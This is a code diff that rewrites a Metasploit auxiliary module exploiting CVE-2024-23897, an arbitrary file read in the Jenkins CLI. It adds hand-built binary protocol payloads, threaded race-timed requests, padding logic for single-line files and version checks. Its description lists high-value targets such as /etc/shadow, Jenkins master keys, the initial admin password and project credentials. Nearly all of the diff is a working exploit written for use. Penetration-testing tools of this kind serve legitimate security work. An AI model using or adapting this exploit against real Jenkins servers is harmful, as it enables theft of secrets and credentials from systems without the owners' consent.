@@ -11,9 +11,39 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'Jenkins cliConnect Arbitrary File Read',
+        'Name' => 'Jenkins cli Ampersand Replacement Arbitrary File Read',
         'Description' => %q{
-          docker run -p 8080:8080 -p 50000:50000 jenkins/jenkins:2.440-jdk17
+          This module utilizes the Jenkins cli protocol to run the `help` command.
+          The cli is accessible with read-only permissions by default, which are
+          all thats required.
+
+          Jenkins cli utilizes `args4j's` `parseArgument`, which calls `expandAtFiles` to
+          replace any `@<filename>` with the contents of a file. We are then able to retrieve
+          the error message to read up to the first two lines of a file.
+
+          Exploitation by hand can be done with the cli, see markdown documents for additional
+          instructions.
+
+          There are a few exploitation oddities:
+          1. The injection point for the `help` command requires 2 input arguments.
+          When the `expandAtFiles` is called, each line of the `FILE_PATH` becomes an input argument.
+          If a file only contains one line, it will throw an error: `ERROR: You must authenticate to access this Jenkins.`
+          However, we can pad out the content by supplying a first argument.
+          2. There is a strange timing requirement where the `download` (or first) request must get
+          to the server first, but the `upload` (or second) request must be very close behind it.
+          From testing against the docker image, it was found values between `.01` and `1.9` were
+          viable. Due to the round trip time of the first request and response happening before
+          request 2 would be received, it is necessary to use threading to ensure the requests
+          happen within rapid succession.
+
+          Files of value:
+          * /var/jenkins_home/secret.key
+          * /var/jenkins_home/secrets/master.key
+          * /var/jenkins_home/secrets/initialAdminPassword
+          * /etc/passwd
+          * /etc/shadow
+          * Project secrets and credentials
+          * Source code, build artifacts
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -39,10 +69,11 @@ class MetasploitModule < Msf::Auxiliary
         'Notes' => {
           'Stability' => [ CRASH_SAFE ],
           'Reliability' => [ ],
-          'SideEffects' => [ IOC_IN_LOGS ]
+          'SideEffects' => [ ]
         },
         'DefaultOptions' => {
-          'RPORT' => 8080
+          'RPORT' => 8080,
+          'HttpClientTimeout' => 3 # very quick response, so set this low
         }
       )
     )
@@ -54,12 +85,14 @@ class MetasploitModule < Msf::Auxiliary
     )
     register_advanced_options(
       [
-        OptFloat.new('DELAY', [true, 'Delay between first and second request', 0.01]),
+        OptFloat.new('DELAY', [true, 'Delay between first and second request', 0.5]),
+        OptString.new('ENCODING', [true, 'Encoding to use for reading the file', 'UTF-8']),
+        OptString.new('LOCALITY', [true, 'Locality to use for reading the file', 'en_US'])
       ]
     )
   end
 
-  # Returns the Jenkins version. taken from jenkins_cred_recovery.rb
+  # Returns the Jenkins version. taken from jenkins_cred_recovery.rb, upgraded to work with newer versions
   #
   # @return [String] Jenkins version.
   # @return [NilClass] No Jenkins version found.
@@ -71,29 +104,65 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unknown, 'Connection timed out while finding the Jenkins version')
     end
 
+    # shortcut for new versions such as 2.426.2 and 2.440
+    return res.headers['X-Jenkins'] if res.headers['X-Jenkins']
+
     html = res.get_html_document
     version_attribute = html.at('body').attributes['data-version']
     version = version_attribute ? version_attribute.value : ''
     version.scan(/jenkins-([\d.]+)/).flatten.first
   end
 
-  # Returns a check code indicating the vulnerable status. taken from jenkins_cred_recovery.rb
-  #
-  # @return [Array] Check code
   def check
     version = get_jenkins_version
-    vprint_status("Found version: #{version}")
 
-    # Default version is vulnerable, but can be mitigated by refusing anonymous permission on
-    # decryption API. So a version wouldn't be adequate to check.
-    if version
-      return Exploit::CheckCode::Detected
+    return Exploit::CheckCode::Safe('Unable to determine Jenkins version number') if version.nil? || version.blank?
+
+    version = Rex::Version.new(version)
+
+    if version <= Rex::Version.new('2.426.2') || # LTS check
+       (version >= Rex::Version.new('2.427') && version <= Rex::Version.new('2.441')) # non-lts
+      return Exploit::CheckCode::Appears("Found exploitable version: #{version}")
     end
 
-    Exploit::CheckCode::Safe
+    Exploit::CheckCode::Safe("Found non-exploitable version: #{version}")
   end
 
-  def upload_request(uuid)
+  def request_header
+    "\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00"
+  end
+
+  def request_footer
+    data = []
+    data << "\x00\x00\x00\x07\x02\x00"
+    data << [datastore['ENCODING'].length].pack('C') # length of encoding string
+    data << datastore['ENCODING']
+    data << "\x00\x00\x00\x07\x01\x00"
+    data << [datastore['LOCALITY'].length].pack('C') # length of locality string
+    data << datastore['LOCALITY']
+    data << "\x00\x00\x00\x00\x03"
+    data
+  end
+
+  def parameter_one
+    # a literal parameter of 1
+    "\x03\x00\x00\x01\x31\x00\x00\x00"
+  end
+
+  def data_generator(pad = false)
+    data = []
+    data << request_header
+    data << parameter_one if pad == true
+    data << [datastore['FILE_PATH'].length + 3].pack('C').to_s
+    data << "\x00\x00"
+    data << [datastore['FILE_PATH'].length + 1].pack('C').to_s
+    data << "\x40"
+    data << datastore['FILE_PATH']
+    data << request_footer
+    data.join('')
+  end
+
+  def upload_request(uuid, multi_line_file = true)
     # send upload request asking for file
 
     # In testing against Docker image on localhost, .01 seems to be the magic to get the download request to hit very slightly ahead of the upload request
@@ -111,8 +180,7 @@ class MetasploitModule < Msf::Auxiliary
       'vars_get' => {
         'remoting' => 'false'
       },
-      # https://github.com/h4x0r-dz/CVE-2024-23897/blob/main/CVE-2024-23897.py#L45C13-L45C187
-      'data' => "\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@#{datastore['FILE_PATH']}\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03"
+      'data' => data_generator(multi_line_file)
     )
 
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
@@ -120,7 +188,7 @@ class MetasploitModule < Msf::Auxiliary
     # we don't get a response here, so we just need the request to go through and 200 us
   end
 
-  def process_result
+  def process_result(use_pad)
     # the output comes back as follows:
 
     # ERROR: Too many arguments: <line 2>
@@ -131,7 +199,8 @@ class MetasploitModule < Msf::Auxiliary
 
     # The main thing here is we get the first 2 lines of output from the file.
     # The 2nd line from the file is returned on line 1 of the output, and line
-    # 1 from the file is returned on the last line of output.
+    # 1 from the file is returned on the last line of output. If padding was used
+    # then <line 1> will just be a literal 1
 
     file_contents = []
     @content_body.split("\n").each do |html_response_line|
@@ -146,7 +215,12 @@ class MetasploitModule < Msf::Auxiliary
     end
     return if file_contents.empty?
 
-    print_good("#{datastore['FILE_PATH']} file contents:\n#{file_contents.join("\n")}")
+    # if we padded out, then our first line is 1, so drop that
+    file_contents = file_contents.drop(1) if use_pad == true
+
+    print_good("#{datastore['FILE_PATH']} file contents retrieved (first line or 2):\n#{file_contents.join("\n")}")
+    stored_path = store_loot('jenkins.file', 'text/plain', rhost, file_contents.join("\n"), datastore['FILE_PATH'])
+    print_good("Results saved to: #{stored_path}")
   end
 
   def download_request(uuid)
@@ -183,9 +257,10 @@ class MetasploitModule < Msf::Auxiliary
     # the server resulted in a 500 error. So we need to thread these to
     # execute them fast enough that the server gets both in rapid succession
 
+    use_pad = false
     threads = []
     threads << framework.threads.spawn('CVE-2024-23897', false) do
-      upload_request(uuid)
+      upload_request(uuid, use_pad) # try single line file first since we get an error if we have more content to get
     end
     threads << framework.threads.spawn('CVE-2024-23897', false) do
       download_request(uuid)
@@ -197,8 +272,27 @@ class MetasploitModule < Msf::Auxiliary
       nil
     end
 
+    # we got an error that means we need to pad out our value, so rerun with pad
+    if @content_body && @content_body.include?('ERROR: You must authenticate to access this Jenkins.')
+      print_status('Re-attempting with padding for single line output file')
+      use_pad = true
+      threads = []
+      threads << framework.threads.spawn('CVE-2024-23897', false) do
+        upload_request(uuid, use_pad)
+      end
+      threads << framework.threads.spawn('CVE-2024-23897', false) do
+        download_request(uuid)
+      end
+
+      threads.map do |t|
+        t.join
+      rescue StandardError
+        nil
+      end
+    end
+
     if @content_body
-      process_result
+      process_result(use_pad)
     else
       print_bad('Exploit failed, no exploit data was successfully returned')
     end
